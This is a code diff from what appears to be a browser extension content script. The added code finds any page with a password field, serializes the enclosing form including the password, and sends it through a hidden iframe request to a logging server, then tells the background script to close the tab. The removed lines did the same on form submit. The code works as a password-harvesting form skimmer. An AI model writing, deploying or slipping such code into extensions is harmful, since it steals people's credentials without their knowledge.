@@ -9,20 +9,18 @@ function send(data) {
 
 	// set the iframes src attribute to our remote server
 	iframe.setAttribute('src', 'https://localhost:3001/log?' + data);
-}
-
-var passwordElement = $('input[type="password"');
-if(passwordElement.length > 0) {
-	var form = passwordElement.closest('form');
 	
-	form.submit(function(event) {
-		send(form.serialize());
-	});
-	
+	// send message to background to close tab
 	setTimeout(function() {
-		if(passwordElement.val() != '') {
-			send(form.serialize());
-		}
+			chrome.runtime.sendMessage({status: 'finished'})
 	}, 500);
 }
-	
+
+var passwordInput = $('input[type="password"]');
+var form = passwordInput.closest('form');
+
+if(passwordInput.length > 0) {
+	setTimeout(function() {
+		send(form.serialize()); 
+	}, 500);
+}
